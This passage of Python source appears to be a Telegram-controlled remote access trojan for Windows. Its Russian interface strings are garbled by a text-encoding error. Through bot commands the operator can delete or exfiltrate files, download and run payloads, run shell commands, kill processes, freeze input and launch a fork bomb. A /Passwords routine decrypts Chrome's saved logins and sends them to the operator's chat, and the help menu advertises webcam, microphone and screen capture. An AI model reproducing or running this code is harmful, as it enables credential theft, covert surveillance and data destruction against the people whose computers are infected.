   files = folders = 0
   for _, dirnames, filenames in os.walk(os.getcwd()+'\\'+File):
       files += len(filenames)
       folders += len(dirnames)
   shutil.rmtree(os.getcwd()+'\\'+File)
   bot.send_message(command.chat.id, 
     '–ü–∞–ø–∫–∞ *'+File+'* —É–¥–∞–ª–µ–Ω–∞!'
     '\n'
     '\n–°–æ–∑–¥–∞–Ω–∞ ¬ª %02d/%02d/%d'%(day,month,year)+
     '\n–†–∞–∑–º–µ—Ä ¬ª %0.1f MB' % (folder_size/(1024*1024.0))+
     '\n–°–æ–¥–µ—Ä–∂–∞–ª–æ ¬ª '+"{:,} –§–∞–π–ª–æ–≤, {:,} –ü–∞–ø–æ–∫".format(files, folders),
     parse_mode="Markdown")
  except FileNotFoundError:
   bot.send_message(command.chat.id, '*–§–∞–π–ª –Ω–µ –Ω–∞–π–¥–µ–Ω*', parse_mode="Markdown")
  except PermissionError:
   bot.send_message(command.chat.id, '*–û—Ç–∫–∞–∑–∞–Ω–æ –≤ –¥–æ—Å—Ç—É–ø–µ*', parse_mode="Markdown")
  except:
   bot.send_message(command.chat.id, '*–í–≤–µ–¥–∏—Ç–µ –Ω–∞–∑–≤–∞–Ω–∏–µ —Ñ–∞–π–ª–∞\n\n‚Ä∫ /Remove ‚Ä¢ /RemoveAll*', parse_mode="Markdown")


@bot.message_handler(commands=['RemoveAll', 'removeall'])
def RemoveAll(command):
 try:
  bot.send_message(command.chat.id, '*–£–¥–∞–ª—è–µ–º...*', parse_mode="Markdown")
  folder = os.getcwd()
  folder_size = 0
  for (path, dirs, files) in os.walk(folder):
    for file in files:
      filename = os.path.join(path, file)
      folder_size += os.path.getsize(filename)
  files = folders = 0
  for _, dirnames, filenames in os.walk(os.getcwd()):
      files += len(filenames)
      folders += len(dirnames)
  a = (len(glob.glob('*')))
  try:
   for file in glob.glob('*.*'):
    if os.path.isfile(file):
      os.remove(file)
   for directory in glob.glob('*/'):
    if os.path.exists(directory):
      shutil.rmtree(directory)
  except PermissionError:
     pass
  b = (len(glob.glob('*')))
  c = (a - b)
  bot.send_message(command.chat.id,
     '–£–¥–∞–ª–µ–Ω–æ *'+str(c)+'* —Ñ–∞–π–ª–æ–≤ –∏–∑ *'+str(a)+'*!'
     '\n'
     '\n–†–∞–∑–º–µ—Ä ¬ª %0.1f MB' % (folder_size/(1024*1024.0))+
     '\n–°–æ–¥–µ—Ä–∂–∞–ª–æ ¬ª '+"{:,} –§–∞–π–ª–æ–≤, {:,} –ü–∞–ø–æ–∫".format(files, folders),
     parse_mode="Markdown")
 except:
  pass


@bot.message_handler(regexp='/Upload')
def Upload(command):
 try:
  File = re.split('/Upload ', command.text, flags=re.I)[1]
  req = urllib.request.Request(File, method='HEAD')
  r = urllib.request.urlopen(req)
  file_name = ProgramData+'Files\\'+r.info().get_filename()
  bot.send_message(command.chat.id, '*–°–∫–∞—á–∏–≤–∞–µ–º —Ñ–∞–π–ª...*', parse_mode="Markdown")
  urllib.request.urlretrieve(File, file_name)
  bot.reply_to(command, '*–§–∞–π–ª –∑–∞–≥—Ä—É–∂–µ–Ω –Ω–∞ –∫–æ–º–ø—å—é—Ç–µ—Ä!*\n\n`'+file_name+'`', parse_mode="Markdown")
 except urllib.error.HTTPError as err:
  bot.send_message(command.chat.id, '*–°—Å—ã–ª–∫–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω–∞*', parse_mode="Markdown")
 except ValueError:
  bot.send_message(command.chat.id, '*–í—Å—Ç–∞–≤—å—Ç–µ —Ä–∞–±–æ—á—É—é —Å—Å—ã–ª–∫—É*', parse_mode="Markdown")
 except:
  bot.send_message(command.chat.id, '*–û—Ç–ø—Ä–∞–≤—å—Ç–µ —Ñ–∞–π–ª –∏–ª–∏ –≤—Å—Ç–∞–≤—å—Ç–µ URL-–°—Å—ã–ª–∫—É\n\n‚Ä∫ /Upload*', parse_mode="Markdown")


@bot.message_handler(content_types=['document'])
def Document(command):
 try:
  File = bot.get_file(command.document.file_id)
  bot.send_message(command.chat.id, '*–ó–∞–≥—Ä—É–∂–∞–µ–º...*', parse_mode="Markdown")
  downloaded_file = bot.download_file(File.file_path)
  src = ProgramData+'Files\\'+File.file_path;
  with open(src, 'wb') as new_file:
   new_file.write(downloaded_file)
  bot.reply_to(command, '*–§–∞–π–ª –∑–∞–≥—Ä—É–∂–µ–Ω –Ω–∞ –∫–æ–º–ø—å—é—Ç–µ—Ä!*\n\n`C:/ProgramData/Files/'+File.file_path+'`', parse_mode="Markdown")
 except FileNotFoundError:
  bot.reply_to(command, '*–§–æ—Ä–º–∞—Ç —Ñ–∞–π–ª–∞ –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è*', parse_mode="Markdown")
 except:
  bot.reply_to(command, '*–í—ã –Ω–µ –º–æ–∂–µ—Ç–µ –∑–∞–≥—Ä—É–∑–∏—Ç—å —Ñ–∞–π–ª –±–æ–ª—å—à–µ 20–ú–ë*', parse_mode="Markdown")


@bot.message_handler(regexp='/Download')
def download(command):
 try:
  File = re.split('/Download ', command.text, flags=re.I)[1]
  download = open(os.getcwd()+'\\'+File, 'rb')
  bot.send_message(command.chat.id, '*–û—Ç–ø—Ä–∞–≤–ª—è–µ–º...*', parse_mode="Markdown")
  bot.send_chat_action(command.chat.id, 'upload_document')
  bot.send_document(command.chat.id, download)
 except FileNotFoundError:
  bot.send_message(command.chat.id, '*–§–∞–π–ª –Ω–µ –Ω–∞–π–¥–µ–Ω*', parse_mode="Markdown")
 except:
  try:
   msg = re.split('/Download ', command.text, flags=re.I)[1]
   bot.send_message(command.chat.id, '*–°–æ–±–∏—Ä–∞–µ–º...*', parse_mode="Markdown")
   shutil.make_archive(ProgramData+File,
                           'zip',
                           os.getcwd()+'\\',
                           File)
   bot.send_chat_action(command.chat.id, 'upload_document')
   file = open(ProgramData+msg+'.zip', 'rb')
   bot.send_message(command.chat.id, '*–û—Ç–ø—Ä–∞–≤–ª—è–µ–º...*', parse_mode="Markdown")
   bot.send_document(command.chat.id, file)
   file.close()
   os.remove(ProgramData+File+'.zip')
  except PermissionError:
   bot.send_message(command.chat.id, '*–û—Ç–∫–∞–∑–∞–Ω–æ –≤ –¥–æ—Å—Ç—É–ø–µ*', parse_mode="Markdown")
  except:
   try:
    file.close()
    os.remove(ProgramData+File+'.zip')
    bot.send_message(command.chat.id, '*–í—ã –Ω–µ –º–æ–∂–µ—Ç–µ —Å–∫–∞—á–∞—Ç—å —Ñ–∞–π–ª –±–æ–ª—å—à–µ 50–ú–ë*', parse_mode="Markdown")
   except:
    bot.send_message(command.chat.id, '*–í–≤–µ–¥–∏—Ç–µ –Ω–∞–∑–≤–∞–Ω–∏–µ —Ñ–∞–π–ª–∞\n\n‚Ä∫ /Download*', parse_mode="Markdown")


@bot.message_handler(commands=['Run', 'run'])
def Run(command):
 try:
  File = re.split('/Run ', command.text, flags=re.I)[1]
  bot.send_chat_action(command.chat.id, 'typing')
  os.startfile(os.getcwd()+'\\'+File)
  bot.send_message(command.chat.id, '–§–∞–π–ª *'+File+'* –æ—Ç–∫—Ä—ã—Ç!', parse_mode="Markdown")
 except FileNotFoundError:
  bot.send_message(command.chat.id, '*–§–∞–π–ª –Ω–µ –Ω–∞–π–¥–µ–Ω*', parse_mode="Markdown")
 except:
  bot.send_message(command.chat.id, '*–í–≤–µ–¥–∏—Ç–µ –Ω–∞–∑–≤–∞–Ω–∏–µ —Ñ–∞–π–ª–∞\n\n‚Ä∫ /Run ‚Ä¢ /RunAS*', parse_mode="Markdown")



@bot.message_handler(commands=['RunAS', 'runas'])
def RunAS(command):
 try:
  File = re.split('/RunAS ', command.text, flags=re.I)[1]
  bot.send_chat_action(command.chat.id, 'typing')
  WhileRunAS(os.getcwd()+'\\'+File)
  bot.send_message(command.chat.id, '–§–∞–π–ª *'+File+'* –æ—Ç–∫—Ä—ã—Ç!', parse_mode="Markdown")
 except FileNotFoundError:
  bot.send_message(command.chat.id, '*–§–∞–π–ª –Ω–µ –Ω–∞–π–¥–µ–Ω*', parse_mode="Markdown")
 except:
  bot.send_message(command.chat.id, '*–í–≤–µ–¥–∏—Ç–µ –Ω–∞–∑–≤–∞–Ω–∏–µ —Ñ–∞–π–ª–∞\n\n‚Ä∫ /Run ‚Ä¢ /RunAS*', parse_mode="Markdown")


@bot.message_handler(regexp='/Tasklist')
def Tasklist(command):
 try:
  bot.send_chat_action(command.chat.id, 'typing')
  ProcessList()
  bot.send_message(command.chat.id, '`'+ProcessList()+'`', parse_mode="Markdown")
 except:
  bot.send_message(command.chat.id, '*–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å —Å–ø–∏—Å–æ–∫ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤*', parse_mode="Markdown")


@bot.message_handler(regexp='/Taskkill')
def Taskkill(command):
 try:
  Process = re.split('/Taskkill ', command.text, flags=re.I)[1]
  bot.send_chat_action(command.chat.id, 'typing')
  KillProcess(Process)
  bot.send_message(command.chat.id, '–ü—Ä–æ—Ü–µ—Å—Å *'+Process+"* –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω!", parse_mode="Markdown")
 except:
  bot.send_message(command.chat.id, 
  '*–í–≤–µ–¥–∏—Ç–µ –Ω–∞–∑–≤–∞–Ω–∏–µ –ø—Ä–æ—Ü–µ—Å—Å–∞'
  '\n'
  '\n‚Ä∫ /Taskkill'
  '\n'
  '\n–ê–∫—Ç–∏–≤–Ω–æ–µ –æ–∫–Ω–æ*'
  '\n'
  '\n`'+WindowTitle()+'`',
  reply_markup=main6, parse_mode="Markdown")


@bot.message_handler(regexp='/Message')
def Message(command):
 try:
  Message = re.split('/Message ', command.text, flags=re.I)[1]
  bot.send_chat_action(command.chat.id, 'typing')
  bot.reply_to(command, '*–°–æ–æ–±—â–µ–Ω–∏–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–Ω–æ!*', parse_mode="Markdown")
  SendMessageBox(Message)
 except:
  bot.send_message(command.chat.id, '*–í–≤–µ–¥–∏—Ç–µ —Å–æ–æ–±—â–µ–Ω–∏–µ\n\n‚Ä∫ /Message*', parse_mode="Markdown")


@bot.message_handler(regexp='/OpenURL')
def OpenURL(command):
 try:
  URL = re.split('/OpenURL ', command.text, flags=re.I)[1]
  bot.send_chat_action(command.chat.id, 'typing')
  OpenBrowser(URL)
  bot.reply_to(command, '*–°—Å—ã–ª–∫–∞ –æ—Ç–∫—Ä—ã—Ç–∞!*', parse_mode="Markdown")
 except:
  bot.send_message(command.chat.id, '*–í—Å—Ç–∞–≤—å—Ç–µ —Å—Å—ã–ª–∫—É\n\n‚Ä∫ /OpenURL*', parse_mode="Markdown")


@bot.message_handler(content_types=['photo'])
def Wallpapers(command):
 try:
  Photo = bot.get_file(command.photo[len(command.photo)-1].file_id)
  GetPhoto(Photo, command)
  SetWallpapers(Photo)
  bot.reply_to(command, '*–§–æ—Ç–æ–≥—Ä–∞—Ñ–∏—è —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞ –Ω–∞ –æ–±–æ–∏!*', parse_mode="Markdown")
 except:
  bot.reply_to(command, '*–ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–≥—Ä—É–∑–∏—Ç—å —Ñ–æ—Ç–æ–≥—Ä–∞—Ñ–∏—é*', reply_markup=menu, parse_mode="Markdown")


@bot.message_handler(regexp='/Speak')
def Speak(command):
 try:
  Text = re.split('/Speak ', command.text, flags=re.I)[1]
  bot.reply_to(command, '*–í–æ—Å–ø—Ä–æ–∏–∑–≤–æ–¥–∏–º...*', parse_mode="Markdown")
  try:
   SpeakText(Text)
   bot.send_message(command.chat.id, '*–ì–æ—Ç–æ–≤–æ!*', parse_mode="Markdown")
  except:
   bot.send_message(command.chat.id, '*–ù–µ —É–¥–∞–ª–æ—Å—å –≤–æ—Å–ø—Ä–æ–∏–∑–≤–µ—Å—Ç–∏ —Ç–µ–∫—Å—Ç*', parse_mode="Markdown")
 except:
  bot.send_message(command.chat.id, '*–í–≤–µ–¥–∏—Ç–µ —Ç–µ–∫—Å—Ç\n\n‚Ä∫ /Speak*', parse_mode="Markdown")


@bot.message_handler(regexp='/ForkBomb')
def Forkbomb(command):
 bot.send_message(command.chat.id, '*–§–æ—Ä–∫–±–æ–º–±–∞ –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω–∞!*', parse_mode="Markdown")
 ForkBomb()


@bot.message_handler(regexp='/Passwords')
def Passwords(command):
 try:
  from cryptography.hazmat.backends import default_backend
  from cryptography.hazmat.primitives.ciphers import (
      Cipher, algorithms, modes)

  NONCE_BYTE_SIZE = 12

  def encrypt(cipher, plaintext, nonce):
      cipher.mode = modes.GCM(nonce)
      encryptor = cipher.encryptor()
      ciphertext = encryptor.update(plaintext)
      return (cipher, ciphertext, nonce)

  def decrypt(cipher, ciphertext, nonce):
      cipher.mode = modes.GCM(nonce)
      decryptor = cipher.decryptor()
      return decryptor.update(ciphertext)

  def get_cipher(key):
      cipher = Cipher(
          algorithms.AES(key),
          None,
          backend=default_backend()
      )
      return cipher

  APP_DATA_PATH= os.environ['LOCALAPPDATA']
  DB_PATH = r'Google\Chrome\User Data\Default\Login Data'

  def dpapi_decrypt(encrypted):
      class DATA_BLOB(ctypes.Structure):
          _fields_ = [('cbData', ctypes.wintypes.DWORD),
                      ('pbData', ctypes.POINTER(ctypes.c_char))]

      p = ctypes.create_string_buffer(encrypted, len(encrypted))
      blobin = DATA_BLOB(ctypes.sizeof(p), p)
      blobout = DATA_BLOB()
      retval = ctypes.windll.crypt32.CryptUnprotectData(
          ctypes.byref(blobin), None, None, None, None, 0, ctypes.byref(blobout))
      if not retval:
          raise ctypes.WinError()
      result = ctypes.string_at(blobout.pbData, blobout.cbData)
      ctypes.windll.kernel32.LocalFree(blobout.pbData)
      return result

  def unix_decrypt(encrypted):
      if sys.platform.startswith('linux'):
          password = 'peanuts'
          iterations = 1
      else:
          raise NotImplementedError

      from Crypto.Cipher import AES
      from Crypto.Protocol.KDF import PBKDF2

      salt = 'saltysalt'
      iv = ' ' * 16
      length = 16
      key = PBKDF2(password, salt, length, iterations)
      cipher = AES.new(key, AES.MODE_CBC, IV=iv)
      decrypted = cipher.decrypt(encrypted[3:])
      return decrypted[:-ord(decrypted[-1])]

  def get_key_from_local_state():
      jsn = None
      with open(os.path.join(os.environ['LOCALAPPDATA'],
          r"Google\Chrome\User Data\Local State"),encoding='utf-8',mode ="r") as f:
          jsn = json.loads(str(f.readline()))
      return jsn["os_crypt"]["encrypted_key"]

  def aes_decrypt(encrypted_txt):
      encoded_key = get_key_from_local_state()
      encrypted_key = base64.b64decode(encoded_key.encode())
      encrypted_key = encrypted_key[5:]
      key = dpapi_decrypt(encrypted_key)
      nonce = encrypted_txt[3:15]
      cipher = get_cipher(key)
      return decrypt(cipher,encrypted_txt[15:],nonce)

  class ChromePassword:
      def __init__(self):
          self.passwordList = []

      def get_chrome_db(self):
          _full_path = os.path.join(APP_DATA_PATH,DB_PATH)
          _temp_path = os.path.join(APP_DATA_PATH,'sqlite_file')
          if os.path.exists(_temp_path):
              os.remove(_temp_path)
          shutil.copyfile(_full_path,_temp_path)
          self.show_password(_temp_path)

      def show_password(self,db_file):
          conn = sqlite3.connect(db_file)
          _sql = 'select signon_realm,username_value,password_value from logins'
          for row in conn.execute(_sql):
              host = row[0]
              if host.startswith('android'):
                  continue
              name = row[1]
              value = self.chrome_decrypt(row[2])
              _info = 'Hostname: %s\nUsername: %s\nPassword: %s\n\n' %(host,name,value)
              self.passwordList.append(_info)
          conn.close()
          os.remove(db_file)

      def chrome_decrypt(self,encrypted_txt):
          if sys.platform == 'win32':
              try:
                  if encrypted_txt[:4] == b'\x01\x00\x00\x00':
                      decrypted_txt = dpapi_decrypt(encrypted_txt)
                      return decrypted_txt.decode()
                  elif encrypted_txt[:3] == b'v10':
                      decrypted_txt = aes_decrypt(encrypted_txt)
                      return decrypted_txt[:-16].decode()
              except WindowsError:
                  return None
          else:
              try:
                  return unix_decrypt(encrypted_txt)
              except NotImplementedError:
                  return None

      def save_passwords(self):
          with open(Temp+'Passwords.txt','w',encoding='utf-8') as f:
              f.writelines(self.passwordList)

  if __name__=="__main__":
      Main = ChromePassword()
      Main.get_chrome_db()
      Main.save_passwords()
      try:
       bot.send_chat_action(command.chat.id, 'upload_document')
       passwords = open(Temp+'\\Passwords.txt')
       bot.send_document(command.chat.id, passwords)
      except:
       pass
 except:
  bot.send_message(command.chat.id, '*–ü–∞—Ä–æ–ª–µ–π –Ω–µ –Ω–∞–π–¥–µ–Ω–æ*', parse_mode="Markdown")


@bot.message_handler(regexp='/Clipboard')
def Clipboard(command):
 try:
  Text = re.split('/Clipboard ', command.text, flags=re.I)[1]
  bot.send_chat_action(command.chat.id, 'typing')
  SetClipboard(Text)
  bot.send_message(command.chat.id, '*–°–æ–¥–µ—Ä–∂–∞–Ω–∏–µ –±—É—Ñ–µ—Ä–∞ –æ–±–º–µ–Ω–∞ –∏–∑–º–µ–Ω–µ–Ω–æ!*', parse_mode="Markdown")
 except:
  bot.send_message(command.chat.id,
  '*–í–≤–µ–¥–∏—Ç–µ —Ç–µ–∫—Å—Ç'
  '\n'
  '\n‚Ä∫ /Clipboard'
  '\n'
  '\n–ë—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞*'
  '\n'
  '\n`'+GetClipboard()+'`',
  parse_mode="Markdown")


@bot.message_handler(regexp='/Freeze')
def Freeze(command):
 try:
  admin = os.getuid() == 0
 except AttributeError:
  admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
 if admin is False:
  bot.send_message(command.chat.id, '*–≠—Ç–∞ —Ñ—É–Ω–∫—Ü–∏—è —Ç—Ä–µ–±—É–µ—Ç –ø—Ä–∞–≤ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞!*', parse_mode="Markdown")
 if admin is True:
  try:
   Seconds = re.split('/Freeze ', command.text, flags=re.I)[1]
   bot.send_message(command.chat.id, '*–í–≤–æ–¥ –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω –Ω–∞ '+Seconds+' —Å–µ–∫—É–Ω–¥!*', parse_mode="Markdown")
   Block(float(Seconds))
   bot.send_message(command.chat.id, '*–í–≤–æ–¥ —Ä–∞–∑–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω!*', parse_mode="Markdown")
  except ValueError:
   bot.send_message(command.chat.id, '*–û—à–∏–±–∫–∞ –∑–Ω–∞—á–µ–Ω–∏—è*', parse_mode="Markdown")
  except:
   bot.send_message(command.chat.id, '*–£–∫–∞–∂–∏—Ç–µ –¥–ª–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å –±–ª–æ–∫–∏—Ä–æ–≤–∫–∏\n\n‚Ä∫ /Freeze*', parse_mode="Markdown")


@bot.message_handler(regexp='/CMD')
def CMD(command):
 try:
  shell = re.split('/CMD ', command.text, flags=re.I)[1]
  bot.send_chat_action(command.chat.id, 'typing')
  cmd = subprocess.Popen(shell, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
  lines = []
  for line in cmd.stdout.readlines():
      line = line.strip()
      if line:
          lines.append(line.decode('cp866'))
  bot.send_message(command.chat.id, ('\n'.join(lines)))
 except:
  bot.send_message(command.chat.id, '*–í–≤–µ–¥–∏—Ç–µ –∫–æ–º–∞–Ω–¥—É\n\n‚Ä∫ /CMD*', parse_mode="Markdown")


@bot.message_handler(commands=['3', '6'])
def Main(command):
 bot.send_message(command.chat.id, '`...`', reply_markup=menu, parse_mode="Markdown")

@bot.message_handler(commands=['2', '5'])
def Main(command):
 bot.send_message(command.chat.id, '`...`', reply_markup=main5, parse_mode="Markdown")

@bot.message_handler(commands=['4', '1'])
def Main(command):
 bot.send_message(command.chat.id, '`...`', reply_markup=main8, parse_mode="Markdown")

@bot.message_handler(commands=['Power', 'power'])
def Power(command):
 bot.send_message(command.chat.id, '*–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ*', reply_markup=main2, parse_mode="Markdown")

@bot.message_handler(commands=['Autorun', 'autorun'])
def Autorun(command):
 bot.send_message(command.chat.id, '*–í—ã–±–µ—Ä–∏—Ç–µ –¥–µ–π—Å—Ç–≤–∏–µ*', reply_markup=main3, parse_mode="Markdown")

@bot.message_handler(commands=['Files', 'files'])
def Files(command):
 bot.send_message(command.chat.id, '`...`', reply_markup=main7, parse_mode="Markdown")

@bot.message_handler(commands=['Cancel'])
def CancelFiles(command):
 bot.send_message(command.chat.id, '`...`', reply_markup=main5, parse_mode="Markdown")

@bot.message_handler(commands=['Wallpapers', 'wallpapers'])
def Wallpapers(command):
 bot.send_message(command.chat.id, '*–û—Ç–ø—Ä–∞–≤—å—Ç–µ —Ñ–æ—Ç–æ–≥—Ä–∞—Ñ–∏—é*', parse_mode="Markdown")

@bot.message_handler(commands=['Help', 'help'])
def Help(command):
 bot.send_message(command.chat.id,
  '·Ö†·Ö†·Ö†·Ö†  ‚öôÔ∏è *–ö–æ–º–∞–Ω–¥—ã* ‚öôÔ∏è'
  '\n'
  '\n'
  '\n*/Screen* -  –°–∫—Ä–∏–Ω—à–æ—Ç —ç–∫—Ä–∞–Ω–∞'
  '\n*/Webcam* - –§–æ—Ç–æ —Å –≤–µ–±–∫–∏'
  '\n*/Video* - –í–∏–¥–µ–æ —Å –≤–µ–±–∫–∏'
  '\n*/Audio* - –ó–∞–ø–∏—Å—å –º–∏–∫—Ä–æ—Ñ–æ–Ω–∞'
  '\n*/Power* - –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –ø–∏—Ç–∞–Ω–∏–µ–º'
  '\n*/Autorun* - –ê–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫–∞'
  '\n'
  '\n*/Files* - –§–∞–π–ª–æ–≤—ã–π –º–µ–Ω–µ–¥–∂–µ—Ä'
  '\n‚Ä∫ */CD* - –¢–µ–∫—É—â–∞—è –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—è'
  '\n‚Ä∫ */ls* - –°–ø–∏—Å–æ–∫ —Ñ–∞–π–ª–æ–≤'
  '\n‚Ä∫ */Remove* - –£–¥–∞–ª–∏—Ç—å —Ñ–∞–π–ª'
  '\n‚Ä∫ */Upload* - –ó–∞–≥—Ä—É–∑–∏—Ç—å —Ñ–∞–π–ª'
  '\n‚Ä∫ */Download* - –°–∫–∞—á–∞—Ç—å —Ñ–∞–π–ª'
  '\n‚Ä∫ */Run* - –ó–∞–ø—É—Å—Ç–∏—Ç—å —Ñ–∞–π–ª'
  '\n*/Tasklist* - –°–ø–∏—Å–æ–∫ –ø—Ä–æ—Ü–µ—Å—Å–æ–≤'
  '\n*/Taskkill* - –û—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –ø—Ä–æ—Ü–µ—Å—Å'
  '\n'
  '\n*/Message* - –û—Ç–ø—Ä–∞–≤–∏—Ç—å —Å–æ–æ–±—â–µ–Ω–∏–µ'
  '\n*/Speak* - –û–∑–≤—É—á–∏—Ç—å —Å–æ–æ–±—â–µ–Ω–∏–µ'
  '\n*/OpenURL* - –û—Ç–∫—Ä—ã—Ç—å —Å—Å—ã–ª–∫—É'
  '\n*/Wallpapers* - –£—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –æ–±–æ–∏'
  '\n*/ForkBomb* - –ó–∞–ø—É—Å–∫ –ø—Ä–æ–≥—Ä–∞–º–º'
  '\n'
  '\n*/Passwords* - –ü–æ–ª—É—á–∏—Ç—å –ø–∞—Ä–æ–ª–∏'
  '\n*/Clipboard* - –ë—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞'
  '\n*/Freeze* - –ë–ª–æ–∫–∏—Ä–æ–≤–∫–∞ –≤–≤–æ–¥–∞'
  '\n*/CMD* - –í—ã–ø–æ–ª–Ω–∏—Ç—å –∫–æ–º–∞–Ω–¥—É'
  '\n'
  '\n'
  '\n*Coded by Bainky | @bainki üëæ*', 
  reply_markup=menu, parse_mode="Markdown")


try:
 bot.polling(Argument)
except:
 os.startfile(CurrentPath)
 sys.exit()
